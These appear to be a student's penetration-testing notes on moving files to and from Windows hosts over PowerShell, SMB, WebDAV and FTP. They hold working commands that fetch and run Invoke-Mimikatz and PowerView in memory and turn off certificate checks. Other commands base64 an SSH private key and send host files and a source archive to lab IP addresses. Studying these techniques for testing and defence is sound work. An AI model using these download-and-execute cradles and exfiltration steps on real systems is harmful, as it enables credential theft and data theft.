
![[Pasted image 20250216110749.png]]

### PowerShell Base64 Encode & Decode

1. md5sum: https://man7.org/linux/man-pages/man1/md5sum.1.html (make sure hash is the same before and after encoding and decoding)
2. Get-FileHash (md5sum for Windows): https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.5&viewFallbackFrom=powershell-7.2
```shell-session
cat id_rsa |base64 -w 0;echo
```
```powershell-session
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("..."))
```
If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original connect.

Problem: cmd.exe has a maximum string length of 8,191 characters. Also, a web shell may error when sending extremely large strings.


### PowerShell Web Downloads

(System.Net.WebClient) used to download a file over HTTP, HTTPS or FTP: https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0

![[Pasted image 20250216112318.png]]
```powershell-session
# Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

### Fileless Method

DownloadString + Invoke-Expression (https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5&viewFallbackFrom=powershell-7.2)

```powershell-session
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
or
```powershell-session
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

Invoke-WebRequest (aliases: iwr, curlr, wget):

```powershell-session
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Download cradles: https://gist.github.com/HarmJ0y/bb48307ffa663256e239

Problem: Internet Explorer may not be set up, so it won't download.

Solution: use -UseBasicParsing
```powershell-session
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Problem: certificate not trusted
Solution:
```powershell-session
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB Downloads

Create SMB server on host with smbserver.py: https://github.com/fortra/impacket/blob/master/examples/smbserver.py
```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

To download to target:
- copy
- move
- Copy-Item
```cmd-session
copy \\192.168.220.133\share\nc.exe
```

Problem: network does not allow unauthenticated guest access

Solution: set up username/password on smbserver and mount on target machine

```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
```cmd-session
net use n: \\192.168.220.133\share /user:test test
```

### FTP Downloads

Create FTP server on host with pyftpdlib: 
```shell-session
sudo pip3 install pyftpdlib
```
```shell-session
sudo python3 -m pyftpdlib --port 21
```

```powershell-session
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

If we do not have an interactive shell, we can use FTP to download a file for us.
![[Pasted image 20250216114249.png]]


### Uploading Operations

Encode Based64 String in Windows
```powershell-session
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
```powershell-session
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

Decode Base64 String in Linux
```shell-session
echo ... | base64 -d > hosts
```
```shell-session
md5sum hosts
```


#### PowerShell Web Uploads

Installing a Configured WebServer with Upload
```shell-session
pip3 install uploadserver
```
```shell-session
python3 -m uploadserver
```

Use PSUpload.ps1 which uses Invoke-RestMethod to perform upload operations: https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1
```powershell-session
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```
```powershell-session
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

#### PowerShell Base64 Web Upload

Invoke-WebRequest or Invoke-RestMethod together with Netcat

Netcat listens and send file as a POST request

```powershell-session
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```
```powershell-session
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
```shell-session
nc -lvnp 8000
```
```shell-session
echo <base64> | base64 -d -w 0 > hosts
```

#### SMB Uploads

SMB is usually blocked, so we instead can do SMB over HTTP with WebDav server.

```shell-session
sudo pip3 install wsgidav cheroot
```
```shell-session
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
Connect on target:
```cmd-session
dir \\192.168.49.128\DavWWWRoot
```
```cmd-session
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```
```cmd-session
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

If SMB is not blocked, we can use impacket-smbserver.


#### FTP Uploads

```shell-session
sudo python3 -m pyftpdlib --port 21 --write
```
```powershell-session
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
![[Pasted image 20250216115759.png]]

